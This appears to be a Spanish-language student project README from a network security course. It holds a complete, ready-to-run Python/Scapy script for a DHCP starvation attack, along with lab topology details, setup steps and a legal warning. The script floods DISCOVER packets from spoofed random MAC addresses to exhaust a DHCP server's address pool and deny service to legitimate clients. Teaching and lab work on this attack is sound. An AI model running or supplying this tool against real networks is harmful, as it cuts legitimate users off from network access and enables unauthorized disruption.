# SegR_DHCP-Starvation-Attack-Simulaci-n-con-Scapy
Script en Python con Scapy que simula un ataque DHCP Starvation, realizado como asignación de Seguridad de Redes con el profesor Jonathan Rondón :))

## DHCP Starvation Attack Script
Con Scapy :)

## Descripción 

¡Hola! Soy **Dayreni Elizabeth Feliz Castillo** y este es mi proyecto para la materia de **Seguridad de Redes.**

Este script es una herramienta de pentesting educativa que desarrollé como parte de las actividades prácticas asignadas por mi maestro, **Jonathan Rondón**. El propósito de este código es demostrar, en un entorno controlado y autorizado, cómo funciona un ataque de agotamiento de direcciones DHCP (conocido como DHCP Starvation Attack).

La implementación utiliza la librería Scapy en Python para construir y enviar paquetes **DHCP DISCOVER** con direcciones MAC falsificadas. Este ataque simula una gran cantidad de clientes nuevos solicitando una dirección IP al servidor DHCP, con el objetivo de agotar su pool de direcciones disponibles y, como resultado, negar el servicio a los clientes legítimos que intenten conectarse a la red.

###### Advertencia Importante: Este script debe utilizarse únicamente con fines educativos y en entornos de laboratorio donde se cuente con el permiso explícito del administrador de La red. Su uso en redes ajenas o sin autorización es ilegal y puede tener consecuencias graves.


Objetivo del Script
-------------
El objetivo principal de este script es realizar un ataque de DHCP Starvation para:

1. **Agotar el pool de direcciones IP**: Enviar peticiones DHCP DISCOVER continuas con direcciones MAC aleatorias para consumir todas las direcciones IP disponibles en el servidor DHCP.

3. **Negar el servicio a clientes legítimos**: Una vez que el pool de direcciones está lleno, cualquier dispositivo legítimo que intente obtener una configuración de red por DHCP no podrá hacerlo.

5. **Demostrar una vulnerabilidad común**: Servir como prueba de concepto para entender la importancia de proteger los servidores DHCP contra este tipo de ataques, por ejemplo, mediante configuraciones de seguridad como DHCP Snooping.

### Configuración de Red del Entorno de Pruebas
-------------
Todos los scripts de ataque fueron diseñados y probados en el siguiente entorno de laboratorio. Es crucial replicar esta configuración para que los ataques funcionen como se espera.

### Resumen Ejecutivo
| Parámetro | Valor |
|---|---|
| Topología | 5 dispositivos (1 Router, 2 Switches, 2 Hosts) |
| Red | 192.168.1.0/24 |
| VLAN | 1 (Default/Nativa) |
| Protocolo STP | PVST+ (Per-VLAN Spanning Tree) |
| Servicio DHCP | Habilitado en R1 |
| Pool DHCP | 192.168.1.10 - 192.168.1.253 |

### Dispositivos y Direccionamiento IP

| Parámetro | Valor |
|---|---|
| Topología | 5 dispositivos (1 Router, 2 Switches, 2 Hosts) |
| Red | 192.168.1.0/24 |
| VLAN | 1 (Default/Nativa) |
| Protocolo STP | PVST+ (Per-VLAN Spanning Tree) |
| Servicio DHCP | Habilitado en R1 |
| Pool DHCP | 192.168.1.10 - 192.168.1.253 |

#### Conectividad Clave
R1 (e0/0) <---> SW1 (e0/0)
SW1 (e0/1) <---> SW2 (e0/0)
SW1 (e0/2) <---> Víctima
SW1 (e0/3) <---> Atacante (Kali Linux)

### Requisitos Previos
- Python 3
- Scapy: sudo apt-get install python3-scapy
- Privilegios de superusuario (root)

### Configuración y Ejecución

#### Creación del Archivo
	sudo nano dhcp_starvation.py

#### Permisos de Ejecución
	sudo chmod +x dhcp_starvation.py

#### Ejecución del Script
Asegúrate de que la variable interface en el script (por defecto ```"eth1"```) coincida con tu interfaz de red del atacante.

	sudo ./dhcp_starvation.py

Detener el ataque
Presiona
```
ctrl+c
```
**Link del video**: https://youtu.be/GADRgDgHE0Y

**Autor**: Dayreni Elizabeth Feliz Castillo

**Asignatura**: Seguridad de Redes

**Docente**: Jonathan Rondón


### SCRIPT :)

    #!/usr/bin/python3
    from scapy.all import *
    import random
    import time
    
    interface = "eth1"
    
    def random_mac():
        return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
    
    def dhcp_starvation():
        print("[+] Iniciando ataque DHCP Starvation...")
        try:
            while True:
                # Generamos una sola MAC
                mac_str = random_mac()
                mac_bytes = bytes.fromhex(mac_str.replace(":", ""))
    
                dhcp_discover = Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff") / \
                                IP(src="0.0.0.0", dst="255.255.255.255") / \
                                UDP(sport=68, dport=67) / \
                                BOOTP(chaddr=mac_bytes) / \
                                DHCP(options=[("message-type", "discover"),
                                              ("end")])
     
                sendp(dhcp_discover, iface=interface, verbose=0)
                print(f"[+] Enviando DHCP Discover desde: {mac_str}")
                time.sleep(random.uniform(0.1, 0.5))
        except KeyboardInterrupt:
            print("\n[+] Ataque detenido.")
    
    if __name__ == "__main__":
        dhcp_starvation()
    

